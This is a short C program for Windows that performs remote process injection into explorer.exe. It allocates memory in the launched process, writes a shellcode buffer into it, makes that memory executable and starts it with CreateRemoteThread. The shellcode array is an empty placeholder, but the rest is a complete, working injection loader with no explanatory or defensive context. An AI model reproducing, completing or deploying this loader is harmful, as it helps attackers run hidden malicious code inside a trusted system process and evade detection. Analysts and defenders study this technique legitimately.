#include <windows.h>

char *targetPath = "explorer.exe";
unsigned char payloadBuffer[] = { /* shellcode bytes go here (unstable) */ };

int main()
{
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // 1. Create target process
    CreateProcessA(NULL, targetPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    // 2. Allocate memory in target process
    SIZE_T payloadSize = sizeof(payloadBuffer);
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // 3. Write payload bytes
    WriteProcessMemory(pi.hProcess, remoteMem, payloadBuffer, payloadSize, NULL);

    // 4. Make memory executable
    DWORD oldProtect = 0;
    VirtualProtectEx(pi.hProcess, remoteMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    // 5. Create remote thread in suspended state
    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, CREATE_SUSPENDED, NULL);

    // 6. Resume remote thread
    ResumeThread(hThread);
    CloseHandle(hThread);

    // 7. Cleanup
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
